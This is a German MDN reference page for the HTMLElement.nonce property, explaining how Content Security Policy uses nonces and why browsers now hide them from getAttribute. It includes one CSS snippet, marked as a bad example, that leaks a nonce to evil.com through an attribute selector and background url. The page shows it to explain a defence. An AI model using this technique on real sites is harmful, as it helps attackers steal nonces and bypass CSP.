---
title: "HTMLElement: Eigenschaft nonce"
short-title: nonce
slug: Web/API/HTMLElement/nonce
l10n:
  sourceCommit: a3d9f61a8990ba7b53bda9748d1f26a9e9810b18
---

{{APIRef("HTML DOM")}}

Die **`nonce`**-Eigenschaft des {{DOMxRef("HTMLElement")}}-Interfaces gibt die kryptografische einmalige Nummer zurück, die von der [Content Security Policy](/de/docs/Web/HTTP/CSP) verwendet wird, um zu bestimmen, ob ein bestimmter Abruf fortgesetzt werden darf.

In späteren Implementierungen geben Elemente ihr `nonce`-Attribut nur noch an Skripte weiter (und nicht an Seitenkanäle wie CSS-Attributselektoren).

## Beispiele

### Abrufen eines Nonce-Wertes

In der Vergangenheit unterstützten nicht alle Browser das `nonce` IDL-Attribut, daher gibt es einen Workaround, bei dem [`getAttribute`](/de/docs/Web/API/Element/getAttribute) als Fallback verwendet wird:

```js
let nonce = script["nonce"] || script.getAttribute("nonce");
```

Allerdings verbergen neuere Browserversionen die auf diese Weise abgerufenen `nonce`-Werte (ein leerer String wird zurückgegeben). Die IDL-Eigenschaft (`script['nonce']`) wird der einzige Weg sein, um Nonces abzurufen.

Das Verbergen von Nonces hilft zu verhindern, dass Angreifer Nonce-Daten über Mechanismen exfiltrieren, die Daten aus Inhaltsattributen abrufen können, wie in diesem CSS-Selektor:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`nonce` globales Attribut](/de/docs/Web/HTML/Global_attributes/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/CSP)
- CSP: {{CSP("script-src")}}
